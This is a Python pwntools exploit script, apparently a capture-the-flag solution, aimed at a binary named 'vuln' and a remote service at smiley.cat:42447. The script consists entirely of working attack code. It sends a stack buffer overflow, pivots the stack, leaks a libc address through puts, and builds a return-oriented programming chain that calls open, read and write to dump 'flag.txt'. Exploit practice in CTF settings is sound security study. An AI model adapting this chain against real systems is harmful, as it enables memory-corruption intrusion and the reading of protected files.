from pwn import *
from pwnlib.term.key import get
from socks import PRINTABLE_PROXY_TYPES

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("smiley.cat", 42447)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


get_puts = 0x401205
read_got = 0x403FE8
put_rbp_0x20 = 0x401211
leave_ret = 0x401226
pop_rbp =    0x401181
pop_rcx = 0x40117e
bss = 0x404020

payload = b"a"*32 + p64(0x404040) 
payload += p64(get_puts)


io.sendline(payload)

payload = b"flag.txt" +p64(0)+ p64(0x404050) + p64(get_puts)
payload += p64(0)
payload += p64(pop_rbp)
payload += p64(0x404010+0x20)
payload += p64(pop_rcx)*70
payload += p64(put_rbp_0x20)
payload += b"flag.txt"
ddebug("b *0x401211 \n continue")

io.sendline(payload)

libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x87be0
log.success("libc:-----> " + hex(libc.address))

pause()
payload = p64(bss +0x200)

"""
0x000000000010f75b : pop rdi ; ret
0x000000000003c068 : pop rsp ; ret
0x0000000000110a4d : pop rsi ; ret
0x00000000000ab8a1 : pop rdx ; or byte ptr [rcx - 0xa], al ; ret
"""

system_addr = libc.symbols.get("system")
openadr = libc.symbols.get("open")
read = libc.symbols.get("read")
write = libc.symbols.get("write")

payload += p64(libc.address + 0x10f75b)
payload += p64(0x404290)
payload += p64(libc.address + 0x0000000000110a4d)
payload += p64(0)
payload += p64(openadr)

payload += p64(pop_rcx)
payload += p64(0x404058)
payload += p64(libc.address + 0x10f75b)
payload += p64(3)
payload += p64(libc.address + 0x0000000000110a4d)
payload += p64(0x404050)
payload += p64(libc.address+0x00000000000ab8a1)
payload += p64(100)
payload += p64(read)

payload += p64(pop_rcx)
payload += p64(0x404058)
payload += p64(libc.address + 0x10f75b)
payload += p64(1)
payload += p64(libc.address + 0x0000000000110a4d)
payload += p64(0x404050)
payload += p64(libc.address+0x00000000000ab8a1)
payload += p64(100)
payload += p64(write)
io.sendline(payload)

io.interactive()
